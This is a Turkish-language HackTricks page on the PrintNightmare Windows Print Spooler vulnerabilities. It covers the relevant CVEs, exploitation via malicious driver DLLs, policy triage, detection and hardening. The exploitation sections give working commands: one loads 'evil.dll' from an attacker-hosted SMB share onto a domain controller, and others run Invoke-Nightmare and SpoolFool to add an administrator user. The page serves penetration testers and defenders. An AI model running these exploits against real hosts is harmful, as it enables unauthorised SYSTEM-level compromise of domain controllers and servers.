# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare, Windows **Print Spooler** hizmetindeki **SYSTEM olarak arbitrary code execution** ve spooler RPC üzerinden erişilebilir olduğunda domain controller'lar ve file server'lar üzerinde **remote code execution (RCE)** sağlayan bir güvenlik açığı ailesine verilen ortak addır. En çok istismar edilen CVE'ler **CVE-2021-1675** (başlangıçta LPE olarak sınıflandırıldı) ve **CVE-2021-34527**'dir (tam RCE). **CVE-2021-34481 (“Point & Print”)** ve **CVE-2022-21999 (“SpoolFool”)** gibi sonraki sorunlar, attack surface'in hâlâ tamamen kapatılmaktan çok uzak olduğunu kanıtlamaktadır.

**Driver-based RCE/LPE** yerine spooler üzerinden **authentication coercion / relay** arıyorsanız, [printer coercion abuse hakkındaki bu diğer sayfaya](printers-spooler-service-abuse.md) bakın. Bu sayfa **driver'ları / DLL'leri SYSTEM olarak yüklemeye** odaklanmaktadır.

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Haziran 2021 CU'da patch'lendi ancak CVE-2021-34527 ile bypass edildi|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`, authenticated user'ların remote share üzerinden bir driver DLL yüklemesine izin verir; Ağustos 2021 sonrası bu işlem genellikle zayıflatılmış Point & Print policy'leri gerektirir|
|2021|CVE-2021-34481|“Point & Print”|LPE|Non-admin user'lar tarafından unsigned driver kurulumu|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Arbitrary directory creation → DLL planting – 2021 patch'lerinden sonra çalışır|

Bunların tümü **MS-RPRN / MS-PAR RPC methods** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) veya **Point & Print** içindeki trust relationship'lerden birini abuse eder.

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

Authenticated ancak **non-privileged** bir domain user, aşağıdaki yöntemle remote spooler üzerinde (çoğunlukla DC) **NT AUTHORITY\SYSTEM** olarak arbitrary DLL'ler çalıştırabilir:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Yaygın PoC'ler arasında **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) ve Benjamin Delpy'nin **mimikatz** içindeki `misc::printnightmare / lsa::addsid` modülleri bulunur.

### 2.2 Yerel privilege escalation (desteklenen tüm Windows sürümleri, 2021-2024)

Aynı API, `C:\Windows\System32\spool\drivers\x64\3\` konumundan yerel olarak bir driver yüklemek ve SYSTEM ayrıcalıkları elde etmek için çağrılabilir:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Güncellenmiş hostlarda modern triage

Tamamen güncellenmiş bir hostta, public PrintNightmare PoC'leri genellikle başarısız olur; bunun nedeni Windows'un artık printer driver kurulumunu varsayılan olarak **yalnızca administrator'larla sınırlaması**dır (`RestrictDriverInstallationToAdministrators=1`, 10 Ağustos 2021'den beri). Bir hedefe exploit uygulamadan önce, ortamın legacy printer dağıtımları için bu güvenlik değişikliğini geri alıp almadığını kontrol edin:
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Genellikle en ilgi çekici iki zayıf değer şunlardır:

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bir PoC çalıştırmadan önce, hedefin ilgili print RPC arayüzlerini açığa çıkardığını Linux üzerinden hızlıca doğrulayın:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Bazı daha yeni public tooling seçenekleri, bir DLL göndermeden önce daha güvenli bir **check/list** iş akışı da sunar:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Düşük yetkili bir kullanıcı olarak `RPC_E_ACCESS_DENIED` (`0x8001011b`) alıyorsanız, genellikle bir taşıma hatası yerine 2021 sonrası varsayılan davranışı görüyorsunuzdur.

> Windows 11 22H2+ ve daha yeni client build'lerinde remote printing varsayılan olarak **RPC over TCP** kullanır ve **RPC over named pipes** (`\PIPE\spoolss`), açıkça yeniden etkinleştirilmediği sürece devre dışıdır. Bazı eski PoC'ler ve lab notları hâlâ named pipe'ın erişilebilir olduğunu varsayar.

### 2.4 “Patched” network'lerde Package Point & Print abuse

Birçok enterprise ortamı, helpdesk veya print-server workflow'ları admin olmayan kullanıcıların driver yüklemesini/güncellemesini hâlâ gerektirdiği için, ilk 2021 patch'lerinden sonra policy nedeniyle **vulnerable** kalmıştır. Pratikte offensive playbook şu hâle gelir:

- Security prompt'ları tamamen devre dışıysa, **classic arbitrary-DLL PrintNightmare** hâlâ en kısa yoldur.
- `Only use Package Point and Print` etkinse, genellikle raw DLL drop yerine **signed package-aware driver** path'ine pivot etmeniz gerekir.
- 2024 research, **`Package Point and Print - Approved servers` seçeneğinin tek başına sağlam bir trust boundary olmadığını** gösterdi: Bir attacker, onaylanmış print server'lardan biri için name resolution'ı spoof edebilir veya hijack edebilirse, victim'lar policy check'lerini karşılayan malicious bir server'a yönlendirilebilir.
- UNC hardening'i forced RPC-over-SMB ile birleştirmek bile kırılgan olabilir; çünkü modern client'lar **RPC over TCP'ye fallback yapabilir**.

Modern PrintNightmare-style exploitation'ın, orijinal 2021 PoC'yi değiştirmeden yeniden çalıştırmaktan ziyade **enterprise printer deployment policy'yi abuse etmeye** odaklanmasının nedeni budur.

### 2.5 SpoolFool (CVE-2022-21999) – 2021 fix'lerini bypass etmek

Microsoft'un 2021 patch'leri remote driver loading'i engelledi ancak **directory permission'larını harden etmedi**. SpoolFool, `SpoolDirectory` parametresini abuse ederek `C:\Windows\System32\spool\drivers\` altında arbitrary bir directory oluşturur, bir payload DLL bırakır ve spooler'ı bunu load etmeye zorlar:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit, Şubat 2022 güncellemelerinden önce tamamen patch'lenmiş Windows 7 → Windows 11 ve Server 2012R2 → 2022 sistemlerinde çalışır

---

## 3. Tespit ve hunting

* **PrintService logları** – *Microsoft-Windows-PrintService/Operational* kanalını etkinleştirin ve başarılı ve başarısız denemelerde **Event ID 316** (driver eklendi/güncellendi; genellikle DLL adlarını içerir) olaylarını izleyin. Şüpheli spooler modülü/driver yükleme hataları için **Event ID 808/811** olaylarıyla birlikte değerlendirin.
* **Sysmon** – Üst süreç **spoolsv.exe** olduğunda `C:\Windows\System32\spool\drivers\*` içinde **Event ID 7** (Image loaded) veya **11/23** (File write/delete) olaylarını izleyin.
* **Process lineage** – **spoolsv.exe** tarafından `cmd.exe`, `rundll32.exe`, PowerShell veya beklenmeyen imzasız bir child process başlatıldığında alert üretin.
* **Network telemetry** – `spoolsv.exe` tarafından attacker-controlled share'lere yapılan beklenmeyen SMB fetch işlemleri veya print server olarak çalışmaması gereken sunuculardan gelen olağandışı printer RPC trafiği, yüksek sinyalli araştırma göstergeleridir.

## 4. Mitigation ve hardening

1. **Patch!** – Print Spooler service kurulu olan her Windows host'a en güncel cumulative update'i uygulayın.
2. **Gerekli olmayan yerlerde spooler'ı disable edin**, özellikle Domain Controller'larda:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Local printing'e izin verirken remote connection'ları block edin** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print'i yalnızca admin'lere açık tutun**:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Ayrıntılı guidance: Microsoft KB5005652
5. İş gereksinimleri `RestrictDriverInstallationToAdministrators=0` ayarlanmasını zorunlu kılıyorsa diğer tüm printer policy'lerini yalnızca **partial mitigation** olarak değerlendirin. En azından **package-aware driver**'ları tercih edin, **Only use Package Point and Print** seçeneğini etkinleştirin ve **Package Point and Print - Approved servers** listesini açıkça belirtilen in-forest print server'larıyla sınırlandırın.
6. Bozuk printer mapping'lerini düzeltmek için printer RPC privacy'yi **rollback etmeyin**. `RpcAuthnLevelPrivacyEnabled=0` ayarlayan environment'lar **CVE-2021-1678** için eklenen hardening'i geri alır ve engagement sırasında genellikle daha fazla incelemeyi hak eder.

---

## 5. İlgili research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modülleri
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`, `-list` ve `-delete` mode'larına sahip standart Impacket implementation'ı
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – built-in SMB delivery, multi-target support ve hem `MS-RPRN` hem de `MS-PAR` mode'larına sahip wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print üzerinden bring-your-own-vulnerable-printer-driver abuse
* SpoolFool exploit ve write-up
* SpoolFool ve diğer spooler bug'ları için 0patch micropatch'leri

Driver yüklemek yerine spooler üzerinden **authentication'ı coerce etmek** istiyorsanız [printer spooler service abuse](printers-spooler-service-abuse.md) bölümüne geçin.

---

## References

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
* itm4n – *A Practical Guide to PrintNightmare in 2024*
<https://itm4n.github.io/printnightmare-exploitation/>
* itm4n – *The PrintNightmare is not Over Yet*
<https://itm4n.github.io/printnightmare-not-over/>
{{#include ../../banners/hacktricks-training.md}}
